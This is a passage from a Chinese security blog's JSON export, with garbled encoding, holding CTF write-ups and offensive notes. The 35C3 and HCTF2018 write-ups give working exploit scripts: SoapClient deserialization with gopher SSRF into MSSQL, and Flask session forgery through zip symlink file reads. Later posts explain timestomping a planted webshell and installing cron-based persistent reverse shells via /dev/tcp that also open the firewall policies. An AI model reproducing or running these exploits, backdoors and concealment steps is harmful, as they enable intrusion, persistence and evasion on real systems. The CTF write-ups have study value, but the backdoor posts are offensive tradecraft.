&#125;","text":"35C3-POSTæ‰«æç›®å½•å¾—åˆ°uploadsç›®å½•ï¼Œæµ‹è¯•ç›®å½•ç©¿è¶ŠæˆåŠŸï¼Œå¾—åˆ°nginxå¤‡ä»½æ–‡ä»¶å’Œæºç  12345678910111213141516171819202122232425262728293031323334353637383940414243444546server &#123; listen 80; access_log /var/log/nginx/example.log; server_name localhost; root /var/www/html; location /uploads &#123; autoindex on; alias /var/www/uploads/; &#125; location / &#123; alias /var/www/html/; index index.php; location ~ \\.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; location /inc/ &#123; deny all; &#125;&#125;server &#123; listen 127.0.0.1:8080; access_log /var/log/nginx/proxy.log; if ( $request_method !~ ^(GET)$ ) &#123; return 405; &#125; root /var/www/miniProxy; location / &#123; index index.php; location ~ \\.php$ &#123; include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.2-fpm.sock; &#125; &#125; &#125; ç”±äº url æ²¡åŠ åç¼€ /ï¼Œè€Œ alias è®¾ç½®äº†æœ‰åç¼€ / é…ç½®ï¼Œå¯¼è‡´å¯ä»¥åˆ©ç”¨ ../ ç»•è¿‡é™åˆ¶è®¿é—®ç›®å½•ã€‚ db.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass DB &#123; private static $con; private static $init = false; private static function initialize() &#123; DB::$con = sqlsrv_connect(\"db\", array(\"pwd\"=&gt; \"Foobar1!\", \"uid\"=&gt;\"challenger\", \"Database\"=&gt;\"challenge\")); if (!DB::$con) DB::error(); DB::$init = true; &#125; private static function error() &#123; die(\"db error\"); &#125; private static function prepare_params($params) &#123; return array_map(function($x)&#123; if (is_object($x) or is_array($x)) &#123; return '$serializedobject$' . serialize($x); &#125; if (preg_match('/^\\$serializedobject\\$/i', $x)) &#123; die(\"invalid data\"); return \"\"; &#125; return $x; &#125;, $params); &#125; private static function retrieve_values($res) &#123; $result = array(); while ($row = sqlsrv_fetch_array($res)) &#123; $result[] = array_map(function($x)&#123; return preg_match('/^\\$serializedobject\\$/i', $x) ? unserialize(substr($x, 18)) : $x; &#125;, $row); &#125; return $result; &#125; public static function query($sql, $values=array()) &#123; if (!is_array($values)) $values = array($values); if (!DB::$init) DB::initialize(); $res = sqlsrv_query(DB::$con, $sql, $values); if ($res === false) DB::error(); return DB::retrieve_values($res); &#125; public static function insert($sql, $values=array()) &#123; if (!is_array($values)) $values = array($values); if (!DB::$init) DB::initialize(); $values = DB::prepare_params($values); $x = sqlsrv_query(DB::$con, $sql, $values); if (!$x) throw new Exception; &#125;&#125; default.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include 'inc/post.php';?&gt;&lt;?php if (isset($_POST[\"title\"])) &#123; $attachments = array(); if (isset($_FILES[\"attach\"]) &amp;&amp; is_array($_FILES[\"attach\"])) &#123; $folder = sha1(random_bytes(10)); mkdir(\"../uploads/$folder\"); for ($i = 0; $i &lt; count($_FILES[\"attach\"][\"tmp_name\"]); $i++) &#123; if ($_FILES[\"attach\"][\"error\"][$i] !== 0) continue; $name = basename($_FILES[\"attach\"][\"name\"][$i]); move_uploaded_file($_FILES[\"attach\"][\"tmp_name\"][$i], \"../uploads/$folder/$name\"); $attachments[] = new Attachment(\"/uploads/$folder/$name\"); &#125; &#125; $post = new Post($_POST[\"title\"], $_POST[\"content\"], $attachments); $post-&gt;save(); &#125; if (isset($_GET[\"action\"])) &#123; if ($_GET[\"action\"] == \"restart\") &#123; Post::truncate(); header(\"Location: /\"); die; &#125; else &#123;?&gt;&lt;h2&gt;Create new post&lt;/h2&gt;&lt;form method=\"POST\" enctype=\"multipart/form-data\"&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;label for=\"title\"&gt;Title&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input name=\"title\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;label for=\"content\"&gt;Content&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input name=\"content\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;label for=\"attach\"&gt;Attachments&lt;/label&gt;&lt;/td&gt; &lt;td&gt;&lt;input name=\"attach[]\" type=\"file\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input name=\"attach[]\" type=\"file\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;input name=\"attach[]\" type=\"file\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"submit\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;&lt;?php &#125; &#125; $posts = Post::loadall(); if (empty($posts)) &#123; echo \"&lt;b&gt;You do not have any posts. Create &lt;a href=\\\"/?action=create\\\"&gt;some&lt;/a&gt;!&lt;/b&gt;\"; &#125; else &#123; echo \"&lt;b&gt;You have \" . count($posts) .\" posts. Create &lt;a href=\\\"/?action=create\\\"&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\\\"/?action=restart\\\"&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;\"; &#125; foreach($posts as $p) &#123; echo $p; echo \"&lt;br&gt;&lt;br&gt;\"; &#125;?&gt; post.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889&lt;?phpclass Attachment &#123; private $url = NULL; private $za = NULL; private $mime = NULL; public function __construct($url) &#123; $this-&gt;url = $url; $this-&gt;mime = (new finfo)-&gt;file(\"../\".$url); if (substr($this-&gt;mime, 0, 11) == \"Zip archive\") &#123; $this-&gt;mime = \"Zip archive\"; $this-&gt;za = new ZipArchive; &#125; &#125; public function __toString() &#123; $str = \"&lt;a href='&#123;$this-&gt;url&#125;'&gt;\".basename($this-&gt;url).\"&lt;/a&gt; ($this-&gt;mime \"; if (!is_null($this-&gt;za)) &#123; $this-&gt;za-&gt;open(\"../\".$this-&gt;url); $str .= \"with \".$this-&gt;za-&gt;numFiles . \" Files.\"; &#125; return $str. \")\"; &#125; &#125; class Post &#123; private $title = NULL; private $content = NULL; private $attachment = NULL; private $ref = NULL; private $id = NULL; public function __construct($title, $content, $attachments=\"\") &#123; $this-&gt;title = $title; $this-&gt;content = $content; $this-&gt;attachment = $attachments; &#125; public function save() &#123; global $USER; if (is_null($this-&gt;id)) &#123; DB::insert(\"INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)\", array($USER-&gt;uid, $this-&gt;title, $this-&gt;content, $this-&gt;attachment)); &#125; else &#123; DB::query(\"UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?\", array($this-&gt;title, $this-&gt;content, $this-&gt;attachment, $USER-&gt;uid, $this-&gt;id)); &#125; &#125; public static function truncate() &#123; global $USER; DB::query(\"DELETE FROM posts WHERE userid = ?\", array($USER-&gt;uid)); &#125; public static function load($id) &#123; global $USER; $res = DB::query(\"SELECT * FROM posts WHERE userid = ? AND id = ?\", array($USER-&gt;uid, $id)); if (!$res) die(\"db error\"); $res = $res[0]; $post = new Post($res[\"title\"], $res[\"content\"], $res[\"attachment\"]); $post-&gt;id = $id; return $post; &#125; public static function loadall() &#123; global $USER; $result = array(); $posts = DB::query(\"SELECT id FROM posts WHERE userid = ? ORDER BY id DESC\", array($USER-&gt;uid)) ; if (!$posts) return $result; foreach ($posts as $p) &#123; $result[] = Post::load($p[\"id\"]); &#125; return $result; &#125; public function __toString() &#123; $str = \"&lt;h2&gt;&#123;$this-&gt;title&#125;&lt;/h2&gt;\"; $str .= $this-&gt;content; $str .= \"&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;\"; foreach ($this-&gt;attachment as $attach) &#123; $str .= \"&lt;li&gt;$attach&lt;/li&gt;\"; &#125; $str .= \"&lt;/il&gt;\"; return $str; &#125;&#125; å¯ä»¥å‘ç°DBç±»çš„queryæ–¹æ³•æŠŠæ¥æ”¶sqlè¯­å¥åæŠŠæ‰§è¡Œç»“æœä¸¢ç»™äº†retrieve_valuesæ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•å­˜åœ¨ä¸€å¤„ååºåˆ—åŒ–æ“ä½œï¼Œä¸”è¦æ±‚ååºåˆ—åŒ–å­—ç¬¦ä¸²å¼€å¤´ä¸º$serializedobject$ åœ¨ mssql ä¸­,MSSQLä¼šè‡ªåŠ¨å°†å…¨è§’unicodeå­—ç¬¦è½¬æ¢ä¸ºASCIIè¡¨ç¤ºå½¢å¼ï¼Œ$sâ„®rializedobject$ å…¥åº“åä¼šå˜æˆ $serializedobject$ ï¼Œæ³¨æ„å‰è€…çš„â„®ä¸æ˜¯ ASCII çš„ eï¼Œæ•´ä¸ªå­—ç¬¦ä¸²çš„ 16 è¿›åˆ¶å¦‚ä¸‹ï¼Œå¯è§å‰è€…çš„â„®çš„ hex æ˜¯ E284AEï¼Œè€Œåè€… e çš„ ASCII æ˜¯ 0x65 æ ¹æ®post.phpï¼Œå¯ä»¥é€šè¿‡SoapClienté€šè¿‡SSRFæ‰“MSSQLï¼Œå‰ææ˜¯è¦èƒ½å¤Ÿè§¦å‘å®ƒçš„callæ–¹æ³•ã€‚ ç±»Attachmentçš„tostringæ–¹æ³•ä¸­æœ‰ä¸€ä¸ª$this-&gt;za-&gt;openæ“ä½œï¼Œæˆ‘ä»¬å°†SoapClientåºåˆ—åŒ–ä¸º$zaï¼Œç„¶åè§¦å‘å…¶__tostring`æ–¹æ³•å³å¯SSRFã€‚ è€Œdefault.phpä¸­å®ä¾‹åŒ–äº†Postç±»ï¼ŒæŠŠ$_POST[&quot;title&quot;], $_POST[&quot;content&quot;], $attachmentsä¼ äº†è¿›å»ï¼Œå¹¶è°ƒç”¨äº†saveæ–¹æ³• ç„¶ååˆè°ƒç”¨loadall()æ–¹æ³•æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢æ“ä½œï¼Œæ­¤æ—¶ä¼šå°†è¿”å›å€¼å¼€å¤´ä¸º$serializedobject$çš„å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–æ“ä½œå¹¶å°†è¿”å›çš„å€¼æ‰“å°è§¦å‘Postç±»çš„__toStringæ–¹æ³•ï¼Œè€Œè¿”å›å€¼å«æœ‰ååºåˆ—åŒ–å¯¹è±¡ï¼Œå› æ­¤åˆå¯ä»¥è§¦å‘ååºåˆ—åŒ–å¯¹è±¡çš„__toStringæ–¹æ³•ï¼Œä»è€Œå¯ä»¥SSRFã€‚ expï¼š 12345678910&lt;?phpclass Attachment &#123; private $za = NULL; public function __construct() &#123; $this-&gt;za = new SoapClient(null,array('location'=&gt;'your_ip','uri'=&gt;'your_ip')); &#125;&#125;$c=new Attachment();$aaa=serialize($c);echo $aaa; ç”±Nginxé…ç½®æ–‡ä»¶å¯çŸ¥ï¼ŒminiProxyä»£ç†ç›‘å¬åœ¨æœ¬åœ°çš„8080ç«¯å£ï¼Œä¸”åªæ¥æ”¶Getè¯·æ±‚,è€ŒSoapClientå‘é€çš„æ˜¯POSTè¯·æ±‚ã€‚ å¾—çŸ¥SoapClientlçš„_user_agentå±æ€§å­˜åœ¨CRLFæ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡\\r\\nå†æ³¨å…¥ä¸€ä¸ªGETè¯·æ±‚ã€‚å¦å¤–miniProxyåªèƒ½ä»£ç† http / httpsè¯·æ±‚,å¯ä»¥é€šè¿‡gopher:///ç»•è¿‡ï¼Œå› ä¸ºminiProxyä»…åœ¨è®¾ç½®hostæ—¶éªŒè¯http / httpsã€‚æˆ–è€…å¯ä»¥é‡å®šå‘åˆ°ä¸€ä¸ªgopherè¯·æ±‚æ¥ç»•è¿‡ã€‚ gopherä¼šåœ¨è¯·æ±‚ååŠ ä¸Šä¸€ä¸ª\\r\\n ï¼Œå› æ­¤æ„é€ gopherè¯·æ±‚æ—¶è¦åœ¨sqlè¯­å¥ååŠ ä¸€ä¸ªæ³¨é‡Šç¬¦-- -, é€šè¿‡æ’å…¥DEBUGå¤´æˆ‘ä»¬å¯ä»¥è·å–åˆ°æˆ‘ä»¬çš„UID expï¼š 12345678910111213141516171819202122import requestsimport base64 host=\"http://50.3.232.201:8000/?\"post=&#123; \"username\":\"123456\", \"password\":\"123456\",&#125; r=requests.Session()url1=host+\"page=login\"r.post(url=url1,data=post)def fetch_uid(): return r.get(host, headers=&#123;\"Debug\": \"1\"&#125;).content.decode().split(\"int(\")[1].split(\")\")[0]payload=base64.b64decode(\"JHNlcmlhbGl6ZWRvYmplY3TvvIRPOjEwOiJBdHRhY2htZW50IjoxOntzOjI6InphIjtPOjEwOiJTb2FwQ2xpZW50IjozOntzOjM6InVyaSI7czozNToiaHR0cDovL2xvY2FsaG9zdDo4MDgwL21pbmlQcm94eS5waHAiO3M6ODoibG9jYXRpb24iO3M6MzU6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC9taW5pUHJveHkucGhwIjtzOjExOiJfdXNlcl9hZ2VudCI7czoxMzk5OiJBQUFBQUhhaGEKCkdFVCAvbWluaVByb3h5LnBocD9nb3BoZXI6Ly8vZGI6MTQzMy9BJTEyJTAxJTAwJTJGJTAwJTAwJTAxJTAwJTAwJTAwJTFBJTAwJTA2JTAxJTAwJTIwJTAwJTAxJTAyJTAwJTIxJTAwJTAxJTAzJTAwJTIyJTAwJTA0JTA0JTAwJTI2JTAwJTAxJUZGJTAwJTAwJTAwJTAxJTAwJTAxJTAyJTAwJTAwJTAwJTAwJTAwJTAwJTEwJTAxJTAwJURFJTAwJTAwJTAxJTAwJUQ2JTAwJTAwJTAwJTA0JTAwJTAwdCUwMCUxMCUwMCUwMCUwMCUwMCUwMCUwMFQwJTAwJTAwJTAwJTAwJTAwJTAwJUUwJTAwJTAwJTA4JUM0JUZGJUZGJUZGJTA5JTA0JTAwJTAwJTVFJTAwJTA3JTAwbCUwMCUwQSUwMCU4MCUwMCUwOCUwMCU5MCUwMCUwQSUwMCVBNCUwMCUwOSUwMCVCNiUwMCUwMCUwMCVCNiUwMCUwNyUwMCVDNCUwMCUwMCUwMCVDNCUwMCUwOSUwMCUwMSUwMiUwMyUwNCUwNSUwNiVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCVENiUwMCUwMCUwMCUwMCUwMCUwMCUwMGElMDB3JTAwZSUwMHMlMDBvJTAwbSUwMGUlMDBjJTAwaCUwMGElMDBsJTAwbCUwMGUlMDBuJTAwZyUwMGUlMDByJTAwJUMxJUE1UyVBNVMlQTUlODMlQTUlQjMlQTUlODIlQTUlQjYlQTUlQjclQTVuJTAwbyUwMGQlMDBlJTAwLSUwMG0lMDBzJTAwcyUwMHElMDBsJTAwbCUwMG8lMDBjJTAwYSUwMGwlMDBoJTAwbyUwMHMlMDB0JTAwVCUwMGUlMDBkJTAwaSUwMG8lMDB1JTAwcyUwMGMlMDBoJTAwYSUwMGwlMDBsJTAwZSUwMG4lMDBnJTAwZSUwMCUwMSUwMSUwMSUwRSUwMCUwMCUwMSUwMCUxNiUwMCUwMCUwMCUxMiUwMCUwMCUwMCUwMiUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMCUwMSUwMCUwMCUwMGklMDBuJTAwcyUwMGUlMDByJTAwdCUwMCUyMCUwMGklMDBuJTAwdCUwMG8lMDAlMjAlMDBwJTAwbyUwMHMlMDB0JTAwcyUwMCUyMCUwMCUyOCUwMHUlMDBzJTAwZSUwMHIlMDBpJTAwZCUwMCUyQyUwMCUyMCUwMHQlMDBpJTAwdCUwMGwlMDBlJTAwJTJDJTAwJTIwJTAwYyUwMG8lMDBuJTAwdCUwMGUlMDBuJTAwdCUwMCUyQyUwMCUyMCUwMGElMDB0JTAwdCUwMGElMDBjJTAwaCUwMG0lMDBlJTAwbiUwMHQlMDAlMjklMDAlMjAlMDB2JTAwYSUwMGwlMDB1JTAwZSUwMHMlMDAlMjAlMDAlMjglMDAyJTAwMCUwMDAlMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTJDJTAwJTIwJTAwJTI4JTAwcyUwMGUlMDBsJTAwZSUwMGMlMDB0JTAwJTIwJTAwZiUwMGwlMDBhJTAwZyUwMCUyMCUwMGYlMDByJTAwbyUwMG0lMDAlMjAlMDBmJTAwbCUwMGElMDBnJTAwLiUwMGYlMDBsJTAwYSUwMGclMDAlMjklMDAlMkMlMDAlMjAlMDAlMjIlMDB0JTAwZSUwMHMlMDB0JTAwJTIyJTAwJTI5JTAwJTNCJTAwJTNCJTAwLSUwMC0lMDAlMjAlMDAtJTAwIEhUVFAvMS4xCkhvc3Q6IGxvY2FsaG9zdAoKIjt9fQ==\")print(payload)data=&#123; \"title\":\"123456\", \"content\":payload,&#125;url2=host+\"action=create\"r.post(url=url2,data=data)","categories":[],"tags":[]},{"title":"HCTF2018-hideandseek","slug":"HCTF2018-hideandseek","date":"2018-12-19T02:47:49.000Z","updated":"2019-12-05T13:19:58.702Z","comments":true,"path":"2018/12/19/HCTF2018-hideandseek/","link":"","permalink":"http://yoursite.com/2018/12/19/HCTF2018-hideandseek/","excerpt":"hide and seekç»è¿‡æ³¨å†Œç™»é™†åå‘ç°æœ‰ä¸Šä¼ ç‚¹ï¼Œå‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œç„¶åå‘ç°zipä¸­å‹ç¼©çš„æ–‡ä»¶å†…å®¹ä¼šè¢«è§£å‹åè¾“å‡ºåœ¨é¡µé¢ä¸Šï¼Œä¸Šä¼ phpé©¬å¤±è´¥ å°è¯•è¯»å–linuxä¸‹çš„ç¯å¢ƒå˜é‡ï¼š/proc/self/environ 1UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=c52b2c48ec0bSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0 æ‰¾åˆ° /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniæ–‡ä»¶ è¯»å–è¿™ä¸ªæ–‡ä»¶","text":"hide and seekç»è¿‡æ³¨å†Œç™»é™†åå‘ç°æœ‰ä¸Šä¼ ç‚¹ï¼Œå‘ç°åªèƒ½ä¸Šä¼ zipæ–‡ä»¶ï¼Œç„¶åå‘ç°zipä¸­å‹ç¼©çš„æ–‡ä»¶å†…å®¹ä¼šè¢«è§£å‹åè¾“å‡ºåœ¨é¡µé¢ä¸Šï¼Œä¸Šä¼ phpé©¬å¤±è´¥ å°è¯•è¯»å–linuxä¸‹çš„ç¯å¢ƒå˜é‡ï¼š/proc/self/environ 1UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=c52b2c48ec0bSHLVL=0PYTHON_PIP_VERSION=18.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2NGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0 æ‰¾åˆ° /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniæ–‡ä»¶ è¯»å–è¿™ä¸ªæ–‡ä»¶ å¾—åˆ°ï¼š 1[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app å†è¯»/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py å¾—åˆ° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomimport flagfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['zip'])def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET'])def index(): error = request.args.get('error', '') if(error == '1'): session.pop('username', None) return render_template('index.html', forbidden=1) if 'username' in session: return render_template('index.html', user=session['username'], flag=flag.flag) else: return render_template('index.html')@app.route('/login', methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] if request.method == 'POST' and username != '' and password != '': if(username == 'admin'): return redirect(url_for('index',error=1)) session['username'] = username return redirect(url_for('index'))@app.route('/logout', methods=['GET'])def logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/upload', methods=['POST'])def upload_file(): if 'the_file' not in request.files: return redirect(url_for('index')) file = request.files['the_file'] if file.filename == '': return redirect(url_for('index')) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a zipfile' try: extract_path = file_save_path + '_' os.system('unzip -n ' + file_save_path + ' -d '+ extract_path) read_obj = os.popen('cat ' + extract_path + '/*') file = read_obj.read() read_obj.close() os.system('rm -rf ' + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1): return redirect(url_for('index', error=1)) return Response(file)if __name__ == '__main__': #app.run(debug=True) app.run(host='127.0.0.1', debug=True, port=10008) å‘ç°éšæœºæ•°ç§å­ä¸å®‰å…¨:ç”±uuid.getnode()è·å¾—ä¸ºå›ºå®šmacåœ°å€ 123random.seed(uuid.getnode())app = Flask(__name__)app.config[&apos;SECRET_KEY&apos;] = str(random.random()*100) æ‰€ä»¥è¯»å–macåœ°å€/sys/class/net/eth0/address macï¼š02:42:ac:11:00:02â€“&gt;2485377892354 ç”¨python3æ‰§è¡Œ 1python3 -c \"import random;random.seed(2485377892354);print (str(random.random()*100))\" å¾—åˆ°secret_key=42.42408197657815 ä¼ªé€ session: eyJ1c2VybmFtZSI6ImFkbWluIn0.XFk6SQ.dp9Uh_Kd6tGKQ12uY7eqoSzvrPo å¾—åˆ°flagï¼šhctf{2495e2ef667b367a0738f5eae9d6afb983c2} è´´ä¸Šç™¾åº¦æ‰¾çš„è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python3# coding=utf-8import requestsimport randomimport reimport osfrom flask import Flaskfrom flask.sessions import SecureCookieSessionInterfacedef read_file(file_name): link(file_name) files = &#123;'the_file': open(file_name[-5:] + '.zip', 'rb')&#125; r2 = s.post(url+'upload', files=files) return r2.textdef link(file_name): os.system('ln -s &#123;file_name&#125; &#123;output&#125;'.format(file_name = file_name, output = file_name[-5:])) os.system('zip -y -m &#123;output&#125;.zip &#123;output&#125;'.format(file_name = file_name, output = file_name[-5:]))url = 'http://hideandseek.2018.hctf.io/'with requests.Session() as s: user_data = &#123;'username': '123', 'password': '123456789'&#125; r = s.post(url+'login', data=user_data) en = read_file('/proc/self/environ') print(en) ini = re.search('UWSGI_INI=(.*?)\\x00', en).group(1) pwd = re.search('PWD=(.*?)\\x00', en).group(1) print(ini) print(pwd) ini = read_file(ini) print(ini) source = re.search('module = .*?\\.(.*?)\\n', ini).group(1) source = pwd+'/'+source+'.py' source = read_file(source) print(source) if(source.find('import') == -1): exit('fail') mac = '/sys/class/net/eth0/address' mac = read_file(mac) mac = mac[:-1] mac = ''.join(mac.split(':')) mac = int(mac, 16) print(mac) random.seed(mac) key = random.random()*100 print(key)app = Flask(__name__)app.config['SECRET_KEY'] = str(key)payload = &#123;'username': 'admin'&#125;serializer = SecureCookieSessionInterface().get_signing_serializer(app)session = serializer.dumps(payload)print(session)cookies = &#123;'session': session&#125;r = requests.get(url, cookies=cookies)print(r.text)","categories":[],"tags":[]},{"title":"è‡ªç”¨Linuxå‘½ä»¤æ‰‹å†Œ","slug":"è‡ªç”¨Linuxå‘½ä»¤æ‰‹å†Œ","date":"2018-11-11T14:42:50.000Z","updated":"2018-11-12T11:57:42.710Z","comments":true,"path":"2018/11/11/è‡ªç”¨Linuxå‘½ä»¤æ‰‹å†Œ/","link":"","permalink":"http://yoursite.com/2018/11/11/è‡ªç”¨Linuxå‘½ä»¤æ‰‹å†Œ/","excerpt":"Linux/Unix ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³Unix ä¸‹è—åé—¨å¿…é¡»è¦ä¿®æ”¹æ—¶é—´ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œç›´æ¥åˆ©ç”¨ touch å°±å¯ä»¥äº†ã€‚ æ¯”å¦‚å‚è€ƒ index.php çš„æ—¶é—´ï¼Œå†èµ‹ç»™ webshell.phpï¼Œç»“æœä¸¤ä¸ªæ–‡ä»¶çš„æ—¶é—´å°±ä¸€æ ·äº†ã€‚","text":"Linux/Unix ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³Unix ä¸‹è—åé—¨å¿…é¡»è¦ä¿®æ”¹æ—¶é—´ï¼Œå¦åˆ™å¾ˆå®¹æ˜“è¢«å‘ç°ï¼Œç›´æ¥åˆ©ç”¨ touch å°±å¯ä»¥äº†ã€‚ æ¯”å¦‚å‚è€ƒ index.php çš„æ—¶é—´ï¼Œå†èµ‹ç»™ webshell.phpï¼Œç»“æœä¸¤ä¸ªæ–‡ä»¶çš„æ—¶é—´å°±ä¸€æ ·äº†ã€‚ åˆ©ç”¨æ–¹æ³• touch -r index.php webshell.php æˆ–è€…ç›´æ¥å°†æ—¶é—´æˆ³ä¿®æ”¹æˆæŸå¹´æŸæœˆæŸæ—¥ã€‚å¦‚ä¸‹ 2018 å¹´ 11 æœˆ 11 æ—¥ã€‚ touch -t 1811111042.30 webshell.php","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"Linuxåé—¨æ€»ç»“","slug":"2018-11-7-Linuxåé—¨æ€»ç»“","date":"2018-11-07T11:09:37.000Z","updated":"2018-11-12T11:57:56.052Z","comments":true,"path":"2018/11/07/2018-11-7-Linuxåé—¨æ€»ç»“/","link":"","permalink":"http://yoursite.com/2018/11/07/2018-11-7-Linuxåé—¨æ€»ç»“/","excerpt":"æµ‹è¯•ç¯å¢ƒubuntu16.04åå¼¹shellç›®æ ‡ï¼š127.0.0.1:233 cronå®šæ—¶åå¼¹shell","text":"æµ‹è¯•ç¯å¢ƒubuntu16.04åå¼¹shellç›®æ ‡ï¼š127.0.0.1:233 cronå®šæ—¶åå¼¹shell ä¿®æ”¹crontabæ–‡ä»¶ åˆ›å»ºæ–‡ä»¶ /etc/â€¦ #!/bin/bash if netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/null then echo &quot;OK&quot;&gt;/dev/null else /sbin/iptables --policy INPUT ACCEPT /sbin/iptables --policy OUTPUT ACCEPT bash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1 fi å¢åŠ æƒé™ chmod +sx /etc/... ç„¶ååœ¨/etc/crontabä¸­æ·»åŠ å®šæ—¶ä»»åŠ¡ */1 * * * * root /etc/... æœ€åé‡å¯ä¸€ä¸‹ crond çš„æœåŠ¡service cron reload ä¸€å¥è¯Crontabåé—¨bashç‰ˆæœ¬(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab forwhoami%100c\\n&quot;)|crontab -pythonç‰ˆæœ¬(crontab -l;printf &quot;*/5 * * * * /usr/bin/python3 -c &#39;import 